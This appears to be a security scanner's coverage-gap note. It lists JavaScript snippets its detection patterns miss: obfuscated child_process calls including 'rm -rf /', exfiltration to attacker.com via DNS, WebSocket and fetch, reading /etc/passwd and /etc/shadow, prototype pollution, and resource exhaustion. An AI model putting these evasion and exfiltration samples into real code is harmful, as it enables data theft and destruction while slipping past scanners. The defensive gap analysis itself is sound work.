# Security Pattern Coverage Gaps

## Current Limitations

### Code Injection - NOT Detected
```javascript
// Indirect eval via variable
const e = eval;
e("malicious code");

// Via Function constructor with spread
new Function(...["a", "b", "return a+b"]);

// Via setImmediate/setInterval with function
setImmediate(function() { require('child_process').exec('rm -rf /') });

// Via Promise constructor
new Promise((r) => r(eval("1")));
```

### Process Spawning - NOT Detected
```javascript
// Dynamic require
const cp = require(String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115));

// Via import()
import('child_process').then(cp => cp.exec('whoami'));

// Obfuscated execution
const cmd = ["e", "x", "e", "c"].join("");
require('child_process')[cmd]('ls');

// Via worker threads with inline code
new Worker("require('child_process').exec('evil')", { eval: true });
```

### Network Exfiltration - NOT Detected
```javascript
// DNS exfiltration
require('dns').resolve('secret-data.attacker.com', () => {});

// WebSocket exfiltration
new WebSocket('ws://attacker.com').send(stolenData);

// Chunked exfiltration via multiple requests
fetch('http://attacker.com/' + data.slice(0, 10));
fetch('http://attacker.com/' + data.slice(10, 20));

// Via image loading (GET exfiltration)
require('http').get('http://attacker.com/?d=' + encodeURIComponent(data));
```

### File System - NOT Detected
```javascript
// Symlink traversal
fs.symlinkSync('/etc/passwd', '/tmp/link');
fs.readFileSync('/tmp/link');

// Path traversal
fs.readFileSync('../../../etc/passwd');
fs.readFileSync(Buffer.from('..2f..2fetc2fpasswd', 'hex'));

// Race condition (TOCTOU)
fs.open('/tmp/file', 'w', (err, fd) => {
  fs.write(fd, maliciousData);
});

// Via stream piping
fs.createReadStream('/etc/shadow').pipe(require('net').connect(9999));
```

### Prototype Pollution - NOT Detected
```javascript
// Via JSON.parse
data = JSON.parse('{"__proto__": {"isAdmin": true}}');

// Via merge
Object.assign({}, JSON.parse(untrusted));

// Via constructor.prototype
obj.constructor.prototype.polluted = true;

// Via Reflect.set
Reflect.set(Object.prototype, 'admin', true);
```

### Timing/Side-Channel - NOT Detected
```javascript
// Timing attack
const start = Date.now();
fs.accessSync('/secret/file');
console.log(Date.now() - start); // reveals if file exists

// Error message disclosure
try {
  fs.readFileSync('/etc/shadow');
} catch(e) {
  console.log(e.message); // leaks file structure
}
```

### Memory/Resource Attacks - NOT Detected
```javascript
// Symbol bomb
for(let i=0; i<1000000; i++) Symbol();

// Closure memory leak
const cache = [];
setInterval(() => {
  cache.push(new Array(1000000).fill('x'));
}, 100);

// Regex DoS (ReDoS)
/a+/.test('a'.repeat(1000000) + 'b');
```

## Recommendations

1. **Use AST Analysis** - Parse code to AST for semantic analysis
2. **Dynamic Analysis** - Instrument code to observe actual behavior
3. **Behavioral Profiling** - Monitor system calls during execution
4. **Allowlisting** - Only permit known-safe patterns
5. **Human Review** - High-risk code requires manual approval
